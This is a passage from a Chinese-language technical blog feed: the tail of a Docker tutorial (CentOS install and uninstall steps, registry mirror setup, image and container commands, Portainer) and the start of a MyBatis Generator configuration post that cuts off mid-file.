#</span><span class="language-bash">1.卸载旧版本</span></span><br><span class="line">[root@localhost ~]yum remove docker \</span><br><span class="line">                             docker-client \</span><br><span class="line">                             docker-client-latest \</span><br><span class="line">                             docker-common \</span><br><span class="line">                             docker-latest \</span><br><span class="line">                             docker-latest-logrotate \</span><br><span class="line">                             docker-logrotate \</span><br><span class="line">                             docker-engine</span><br><span class="line">                  </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">2.需要的安装包</span> </span><br><span class="line">[root@localhost ~]yum install -y yum-utils   </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">3.设置镜像仓库</span></span><br><span class="line">[root@localhost ~]yum-config-manager \</span><br><span class="line">    --add-repo \</span><br><span class="line">    https://download.docker.com/linux/centos/docker-ce.repo</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">4.更新yum软件包索引</span> </span><br><span class="line">[root@localhost ~]yum makecache fast</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">5.安装docker相关的 docker-ce 社区版 而ee是企业版</span> </span><br><span class="line">[root@localhost ~]yum install docker-ce docker-ce-cli containerd.io </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">6.使用docker version查看是否安装成功</span> </span><br><span class="line">[root@localhost ~]docker version </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">7.启动Docker并设置为开机自启</span></span><br><span class="line">[root@localhost ~]systemctl start docker</span><br><span class="line">[root@localhost ~]systemctl enable docker</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">8.运行 hello-world 映像验证 Docker Engine 是否已正确安装。</span></span><br><span class="line">[root@localhost ~]docker run hello-world </span><br><span class="line">Hello from Docker! </span><br><span class="line">This message shows that your installation appears to be working correctly. </span><br><span class="line"></span><br><span class="line">To generate this message, Docker took the following steps: </span><br><span class="line">1. The Docker client contacted the Docker daemon. </span><br><span class="line">2. The Docker daemon pulled the &quot;hello-world&quot; image from the Docker Hub. (amd64) </span><br><span class="line">3. The Docker daemon created a new container from that image which runs the executable that produces the output you are currently reading. </span><br><span class="line">4. The Docker daemon streamed that output to the Docker client, which sent it to your terminal. </span><br><span class="line"></span><br><span class="line">To try something more ambitious, you can run an Ubuntu container with: </span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker run -it ubuntu bash</span> </span><br><span class="line"></span><br><span class="line">Share images, automate workflows, and more with a free Docker ID: </span><br><span class="line">https://hub.docker.com/ </span><br><span class="line"></span><br><span class="line">For more examples and ideas, visit: </span><br><span class="line">https://docs.docker.com/get-started/</span><br></pre></td></tr></table></figure><h2 id="卸载步骤"><a href="#卸载步骤" class="headerlink" title="卸载步骤"></a>卸载步骤</h2><ol><li><p>停止Docker：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop Docker</span><br></pre></td></tr></table></figure></li><li><p>卸载 Docker Engine、CLI 和 Containerd 包：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum remove docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure></li><li><p>主机上的映像、容器、卷或自定义配置文件不会自动删除。删除所有镜像、容器和卷：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -rf /var/lib/docker</span><br><span class="line">rm -rf /var/lib/containerd</span><br></pre></td></tr></table></figure></li></ol><p>您必须手动删除所有已编辑的配置文件。</p><h2 id="配置阿里云镜像加速"><a href="#配置阿里云镜像加速" class="headerlink" title="配置阿里云镜像加速"></a>配置阿里云镜像加速</h2><ol><li>创建目录：<code>mkdir -p /etc/docker</code></li><li>打开配置文件：<code>vi /etc/docker/daemon.json</code></li><li>更改配置文件，设置镜像加速器(二选一)<ul><li>网易：<code>&#123;&quot;registry-mirrors&quot;: [&quot;http://hub-mirror.c.163.com&quot;]&#125;</code></li><li>阿里云（推荐）：<code>&#123;&quot;registry-mirrors&quot;:[&quot;https://drkkei0a.mirror.aliyuncs.com&quot;]&#125;</code></li></ul></li><li>重新加载配置文件：<code>systemctl daemon-reload</code></li><li>重启Docker：<code>systemctl restart docker</code></li></ol><blockquote><p>阿里云的镜像地址需要自己登陆阿里云获取。</p><p>步骤是：<strong>登陆阿里云-容器镜像服务-镜像加速器-CentOS</strong>，找到自己的地址。</p><p>（<a href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors%EF%BC%89">https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors）</a></p></blockquote><h2 id="底层原理"><a href="#底层原理" class="headerlink" title="底层原理"></a>底层原理</h2><p><code>docker run hello-world</code>，run干了什么？</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20210601231109.png"></p><hr><p>Docker是怎么工作的？</p><p>Docker是一个<strong>Client-Server结构</strong>的系统，Docker守护进程运行在主机上， 然后通过Socket连接从客户端访问，守护进程从客户端接受命令并管理运行在主机上的容器。 容器，是一个运行时环境，就是我们前面说到的集装箱。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20210601232208.png"></p><hr><p>为什么Docker比VM快？</p><ol><li>docker有着比虚拟机更少的抽象层。由于docker不需要Hyper-visor<strong>实现硬件资源虚拟化</strong>，运行在docker容器上的程序直接使用的都是实际物理机的硬件资源。因此在CPU、内存利用率上docker将会在效率上有明显优势。</li><li>docker利用的是宿主机的内核，而不需要Guest OS。因此当新建一个容器时，docker不需要和虚拟机一样重新加载一个操作系统内核。从而避免引寻、加载操作系统内核这个比较费时费资源的过程，当新建一个虚拟机时，虚拟机软件需要加载Guest OS，这个新建过程是分钟级别的。而docker由于直接利用宿主机的操作系统,则省略了这个过程，因此新建一个docker容器只需要几秒钟。</li></ol><p>​                   <img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20210601232756.png"></p><table><thead><tr><th></th><th>Dcoker容器</th><th>虚拟机（VM）</th></tr></thead><tbody><tr><td>操作系统</td><td>与宿主机共享OS</td><td>宿主机OS上运行虚拟机OS</td></tr><tr><td>存储大小</td><td>镜像小，便于存储和传输</td><td>镜像庞大（vmdk，vdi等）</td></tr><tr><td>运行性能</td><td>几乎无额外性能损失</td><td>操作系统额外的CPU、内存消耗</td></tr><tr><td>移植性</td><td>轻便灵活，适应于Linux</td><td>笨重，与虚拟化技术耦合度高</td></tr></tbody></table><hr><h1 id="帮助命令"><a href="#帮助命令" class="headerlink" title="帮助命令"></a>帮助命令</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker version #显示docker的版本信息。 </span><br><span class="line">docker info #显示docker的系统信息，包括镜像和容器的数量 </span><br><span class="line">docker --help #帮助命令</span><br></pre></td></tr></table></figure><hr><h1 id="镜像命令"><a href="#镜像命令" class="headerlink" title="镜像命令"></a>镜像命令</h1><h2 id="docker-images"><a href="#docker-images" class="headerlink" title="docker images"></a>docker images</h2><p>列出本地主机上的所有镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]docker images </span><br><span class="line">REPOSITORY   TAG    IMAGE ID       CREATED        SIZE </span><br><span class="line">mysql        5.7    e73346bdf465   24 hours ago   448MB</span><br></pre></td></tr></table></figure><blockquote><p>REPOSITORY：表示镜像的仓库源</p><p>TAG：镜像的标签</p><p>IMAGE ID：镜像ID</p><p>CREATED：镜像创建时间</p><p>SIZE：镜像大小</p><p>同一仓库源可以有多个 TAG，代表这个仓库源的不同个版本，我们使用 REPOSITORY:TAG 来定义不同的镜像。</p><p>如果你不指定一个镜像的版本标签，例如你只使用 ubuntu，docker 将默认使用 ubuntu:latest 镜像，最新镜像</p><p><strong>可选项 Options：</strong></p><ul><li>-a列出本地所有的镜像，含中间映像层</li><li>-q   只显示镜像ID</li><li>–digests   显示镜像的摘要信息</li><li>–no-trunc   显示完整的镜像信息</li></ul></blockquote><hr><h2 id="docker-search"><a href="#docker-search" class="headerlink" title="docker search"></a>docker search</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]docker search [OPTIONS] 某个镜像名字 </span><br></pre></td></tr></table></figure><blockquote><p>是在远程仓库【dockerhub】中搜索：<a href="https://hub.docker.com/">https://hub.docker.com/</a></p><p><strong>可选项 Options：</strong></p><ul><li><p>–automated    只列出automated   build类型的镜像</p></li><li><p>-s    列出收藏数不小于指定值得镜像</p></li><li><p>–no-trunc    显示完整的镜像信息</p></li></ul></blockquote><hr><h2 id="docker-pull"><a href="#docker-pull" class="headerlink" title="docker pull"></a>docker pull</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]docker pull 镜像名[:tag]</span><br></pre></td></tr></table></figure><blockquote><p>docker pull tomcat:8 等价于 docker pull docker.io&#x2F;library&#x2F;tomcat:8（真实地址）</p><p>如果不写tag，默认就是latest </p></blockquote><hr><h2 id="docker-rmi"><a href="#docker-rmi" class="headerlink" title="docker rmi"></a>docker rmi</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]docker rmi -f 镜像id #删除指定的镜像 </span><br><span class="line">[root@localhost ~]docker rmi -f 镜像id 镜像id 镜像id 镜像id #删除指定的镜像 </span><br><span class="line">[root@localhost ~]docker rmi -f $(docker images -aq) #删除全部的镜像</span><br></pre></td></tr></table></figure><blockquote><p>镜像id也可以换成镜像名[:tag]</p></blockquote><h1 id="容器命令"><a href="#容器命令" class="headerlink" title="容器命令"></a>容器命令</h1><p><strong>有了镜像才能创建容器。</strong></p><h2 id="新建并启动容器"><a href="#新建并启动容器" class="headerlink" title="新建并启动容器"></a>新建并启动容器</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]docker run [OPTIONS] IMAGE </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启动一个做了端口映射的tomcat：</span></span><br><span class="line">[root@localhost ~]docker run -d -p 8888:8080 tomcat</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">以交互模式启动一个容器，在容器内执行/bin/bash命令：</span></span><br><span class="line">[root@localhost ~]docker exec -it 容器的id或者名字 /bin/bash</span><br></pre></td></tr></table></figure><blockquote><p><strong>可选项 Options（常用）：</strong>有些是一个减号，有些是两个减号（一般是全称）</p><p>–name&#x3D;”容器新名字”：为容器指定一个名称；</p><p>-d：后台运行容器，并返回容器ID，也即启动守护式容器；</p><p>-i：以交互模式运行容器，通常与 -t 同时使用；</p><p>-e：环境配置</p><p>-t：为容器重新分配一个<strong>伪输入终端</strong>，通常与 -i 同时使用；</p><p>-P（大写）：随机端口映射；</p><p>-p：指定端口映射：</p><ul><li><p>-p ip:主机端口:容器端口 </p></li><li><p>-p ip::容器端口 </p></li><li><p>-p 主机端口:容器端口(常用) </p></li><li><p>-p 容器端口</p></li></ul></blockquote><hr><h2 id="列出当前所有正在运行的容器"><a href="#列出当前所有正在运行的容器" class="headerlink" title="列出当前所有正在运行的容器"></a>列出当前所有正在运行的容器</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]docker ps [OPTIONS]</span><br></pre></td></tr></table></figure><blockquote><p><strong>可选项 Options（常用）：</strong></p><p>-a：列出当前所有正在运行的容器+历史上运行过的(常用)</p><p>-l：显示最近创建的容器。</p><p>-n：显示最近n个创建的容器。</p><p>-q：静默模式，只显示容器编号。</p><p>–no-trunc：不截断输出。</p></blockquote><hr><h2 id="退出交互的容器"><a href="#退出交互的容器" class="headerlink" title="退出交互的容器"></a>退出交互的容器</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第一种：容器停止退出</span></span><br><span class="line">[root@localhost /bin/bash]exit</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第二种：容器不停止退出</span></span><br><span class="line">ctrl+p+q</span><br></pre></td></tr></table></figure><hr><h2 id="启动、停止和重启容器"><a href="#启动、停止和重启容器" class="headerlink" title="启动、停止和重启容器"></a>启动、停止和重启容器</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]docker start 容器的id或者名字</span><br><span class="line">[root@localhost ~]docker stop 容器的id或者名字</span><br><span class="line">[root@localhost ~]docker restart 容器的id或者名字</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">强制停止容器：</span></span><br><span class="line">[root@localhost ~]docker kill 容器的id或者名字</span><br></pre></td></tr></table></figure><hr><h2 id="删除已停止容器"><a href="#删除已停止容器" class="headerlink" title="删除已停止容器"></a>删除已停止容器</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]docker rm 容器的id或者名字</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">一次性删除多个容器：</span></span><br><span class="line">[root@localhost ~]docker rm -f $(docker ps -aq)</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">或者</span></span><br><span class="line">[root@localhost ~]docker ps -a -q | xargs docker rm</span><br></pre></td></tr></table></figure><hr><h2 id="其他常用命令"><a href="#其他常用命令" class="headerlink" title="其他常用命令"></a>其他常用命令</h2><h3 id="启动守护式容器"><a href="#启动守护式容器" class="headerlink" title="启动守护式容器"></a>启动守护式容器</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]docker run -d 镜像名</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用镜像centos:latest以后台模式启动一个容器</span></span><br><span class="line">[root@localhost ~]docker run -d centos</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">问题：</span></span><br><span class="line">docker ps -a 进行查看, 会发现centos容器已经退出</span><br><span class="line"></span><br><span class="line">很重要的要说明的一点: Docker容器后台运行,就必须有一个前台进程。</span><br><span class="line"></span><br><span class="line">容器运行的命令如果不是那些一直挂起的命令（比如运行top，tail），就会自动退出的。</span><br><span class="line">centos为后台进程模式运行,就导致docker前台没有运行的应用,</span><br><span class="line">这样的容器后台启动后,会立即停止因为它觉得它没有停供服务了。</span><br><span class="line"></span><br><span class="line">所以，最佳的解决方案是，将你要运行的程序以前台进程的形式运行。</span><br></pre></td></tr></table></figure><hr><h3 id="查看容器日志"><a href="#查看容器日志" class="headerlink" title="查看容器日志"></a>查看容器日志</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]docker logs -f -t --tail n 容器id</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">模拟日志</span></span><br><span class="line">[root@localhost ~]docker run -d centos /bin/sh -c &quot;while true;do echo 6666;sleep 1;done&quot; </span><br></pre></td></tr></table></figure><blockquote><ul><li><p>-t 是加入时间戳</p></li><li><p>-f 跟随最新的日志打印</p></li><li><p>–tail 数字 显示最后多少条</p></li></ul></blockquote><hr><h3 id="查看容器内运行的进程"><a href="#查看容器内运行的进程" class="headerlink" title="查看容器内运行的进程"></a>查看容器内运行的进程</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]docker top 容器id</span><br></pre></td></tr></table></figure><hr><h3 id="查看容器的元数据"><a href="#查看容器的元数据" class="headerlink" title="查看容器的元数据"></a>查看容器的元数据</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]docker inspect 容器id</span><br></pre></td></tr></table></figure><hr><h3 id="进入运行的容器并以命令行交互"><a href="#进入运行的容器并以命令行交互" class="headerlink" title="进入运行的容器并以命令行交互"></a>进入运行的容器并以命令行交互</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">通常容器都是使用后台方式运行的，需要进入容器修改一些配置时可以使用如下命令：</span></span><br><span class="line">[root@localhost ~]docker exec -it 容器id /bin/bash</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">重新进入容器：</span></span><br><span class="line">[root@localhost ~]docker attach 容器id</span><br></pre></td></tr></table></figure><blockquote><p>区别：</p><ul><li>exec是在容器中打开新的终端，并且可以启动新的进程</li><li>attach是直接进入容器启动命令的终端，不会启动新的进程</li></ul></blockquote><hr><h3 id="容器和主机间的文件拷贝"><a href="#容器和主机间的文件拷贝" class="headerlink" title="容器和主机间的文件拷贝"></a>容器和主机间的文件拷贝</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">从容器拷贝文件到宿主机</span></span><br><span class="line">[root@localhost ~]docker cp 容器id:容器内路径 目的主机路径</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">从宿主机拷贝文件到容器</span></span><br><span class="line">[root@localhost ~]docker cp 目的主机路径 容器id:容器内路径</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">例如</span></span><br><span class="line">[root@localhost ~]docker cp 55321bcae33d:/usr/local/text.txt /root/</span><br><span class="line">[root@localhost ~]docker cp /opt/test/file.txt 55321bcae33d:/opt/testnew/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  需要注意的是，不管容器有没有启动，拷贝命令都会生效。</span></span><br></pre></td></tr></table></figure><hr><h1 id="Docker可视化"><a href="#Docker可视化" class="headerlink" title="Docker可视化"></a>Docker可视化</h1><p>Portainer是一个可视化的容器镜像的图形管理工具，利用Portainer可以轻松构建，管理和维护Docker环境。 而且完全免费，基于容器化的安装方式，方便高效部署。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]docker run -d -p 9000:9000 --restart=always -v /var/run/docker.sock:/var/run/docker.sock --privileged=true portainer/portainer</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于MBG和Mybatis-Plus的自动生成</title>
      <link href="/posts/6e4f/"/>
      <url>/posts/6e4f/</url>
      
        <content type="html"><![CDATA[<h1 id="MBG"><a href="#MBG" class="headerlink" title="MBG"></a>MBG</h1><p><a href="https://liuzh.blog.csdn.net/article/details/42102297">CSDN MyBatis Generator 详解</a></p><p><a href="http://mybatis.org/generator/index.html">MyBatis Generator官方文档</a></p><p><strong>具体使用：</strong></p><p>Pom.xml文件引入相关依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.generator<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-generator-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">verbose</span>&gt;</span>true<span class="tag">&lt;/<span class="name">verbose</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">overwrite</span>&gt;</span>true<span class="tag">&lt;/<span class="name">overwrite</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">configurationFile</span>&gt;</span>src/main/resources/Mybatis-GeneratorConfig.xml<span class="tag">&lt;/<span class="name">configurationFile</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">id</span>&gt;</span>Generate MyBatis Artifacts<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>generate<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.generator<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-generator-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure><p>pom中配置<configurationFile>的路径下的MBG配置文件（根据需求修改）：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">generatorConfiguration</span></span></span><br><span class="line"><span class="meta">        <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">generatorConfiguration</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--配置要链接的数据库的数据源--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">classPathEntry</span></span></span><br><span class="line"><span class="tag">            <span class="attr">location</span>=<span class="string">&quot;D:\jdbc驱动\mysql-connector-java-8.0.15\mysql-connector-java-8.0.15/mysql-connector-java-8.0.15.jar&quot;</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!---Mybatis上下文--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context</span> <span class="attr">id</span>=<span class="string">&quot;MySqlContext&quot;</span> <span class="attr">targetRuntime</span>=<span class="string">&quot;MyBatis3&quot;</span> <span class="attr">defaultModelType</span>=<span class="string">&quot;flat&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;beginningDelimiter&quot;</span> <span class="attr">value</span>=<span class="string">&quot;`&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;endingDelimiter&quot;</span> <span class="attr">value</span>=<span class="string">&quot;`&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">commentGenerator</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--去除注释--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;suppressAllComments&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--注释中去除日期注释--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;suppressDate&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--注释中添加数据库字段备注注释--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;addRemarkComments&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">commentGenerator</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--配置数据库的链接信息--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">jdbcConnection</span> <span class="attr">driverClass</span>=<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">connectionURL</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/course_center&quot;</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">userId</span>=<span class="string">&quot;root&quot;</span></span></span><br><span 